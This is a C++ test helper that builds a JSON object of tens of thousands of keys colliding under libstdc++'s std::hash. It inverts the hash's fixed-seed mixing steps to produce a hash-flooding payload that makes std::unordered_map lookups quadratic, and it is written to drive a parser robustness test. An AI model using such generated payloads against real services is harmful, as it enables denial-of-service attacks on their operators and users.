// hash_collide_gen.cpp <count> <out.json> : a JSON object whose keys ALL have the same 64-bit std::hash<std::string>.
//
// Test helper for json_hash_flood_test.sh. libstdc++'s std::hash<std::string> is _Hash_bytes, a Murmur variant with a
// FIXED seed in which every step can be undone, so anyone can make keys that land in one bucket of an
// std::unordered_map: its lookups then walk one chain and the time grows with the square of the number of keys.
// Keys are 24 printable bytes: the first two 8-byte blocks are random, the third is solved so that the state before
// the final mixing is the same for all keys (tried until its eight bytes are printable: about 3,300 tries a key).
// The program checks its own claim with the real std::hash and exits 1 when the keys do not collide (another C++
// library: the test is then skipped, there is nothing to attack).
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <functional>
#include <random>
#include <string>
#include <vector>

typedef uint64_t u64;
static const u64 MUL = (u64(0xc6a4a793UL) << 32) + u64(0x5bd1e995UL);
static u64 sm(u64 v) { return v ^ (v >> 47); }
static u64 inv_odd(u64 a) { u64 x = a; for (int i = 0; i < 6; ++i) x *= 2 - a * x; return x; }   // inverse mod 2^64
static u64 load(const char* p) { u64 v; __builtin_memcpy(&v, p, 8); return v; }
static bool ok(char c) { return c >= 0x20 && c <= 0x7e && c != '"' && c != '\\'; }

int main(int argc, char** argv) {
    size_t want = argc > 1 ? (size_t)std::atol(argv[1]) : 40000;
    const char* out = argc > 2 ? argv[2] : "collide.json";
    const size_t LEN = 24;
    const u64 seed = 0xc70f6907UL;
    const u64 imul = inv_odd(MUL);
    std::mt19937_64 rng(20261124);
    auto rnd_block = [&](char* b) { for (int i = 0; i < 8; ++i) { char c; do c = char(0x20 + rng() % 95); while (!ok(c)); b[i] = c; } };
    auto step = [&](u64 h, u64 k) { u64 d = sm(k * MUL) * MUL; return (h ^ d) * MUL; };
    u64 h0 = seed ^ (LEN * MUL);
    char b1[8], b2[8], b3[8];
    rnd_block(b1); rnd_block(b2); rnd_block(b3);
    const u64 target = step(step(step(h0, load(b1)), load(b2)), load(b3));
    std::vector<std::string> keys;
    keys.reserve(want);
    while (keys.size() < want) {
        rnd_block(b1); rnd_block(b2);
        u64 h2 = step(step(h0, load(b1)), load(b2));
        // (h2 ^ d3) * MUL == target  ->  d3 = target * imul ^ h2 ;  d3 = sm(k3 * MUL) * MUL  ->  k3 = sm(d3 * imul) * imul
        u64 d3 = (target * imul) ^ h2;
        u64 k3 = sm(d3 * imul) * imul;
        __builtin_memcpy(b3, &k3, 8);
        bool good = true;
        for (int i = 0; i < 8; ++i) if (!ok(b3[i])) { good = false; break; }
        if (!good) continue;
        std::string k; k.append(b1, 8); k.append(b2, 8); k.append(b3, 8);
        keys.push_back(k);
    }
    std::hash<std::string> H; size_t h = H(keys[0]), same = 0;
    for (auto& k : keys) if (H(k) == h) ++same;
    if (same != keys.size()) { std::fprintf(stderr, "the keys do not collide under this std::hash\n"); return 1; }
    FILE* f = std::fopen(out, "w");
    if (!f) return 2;
    std::fputc('{', f);
    for (size_t i = 0; i < keys.size(); ++i) { if (i) std::fputc(',', f); std::fprintf(f, "\"%s\":\"v\"", keys[i].c_str()); }
    std::fputc('}', f);
    std::fclose(f);
    return 0;
}
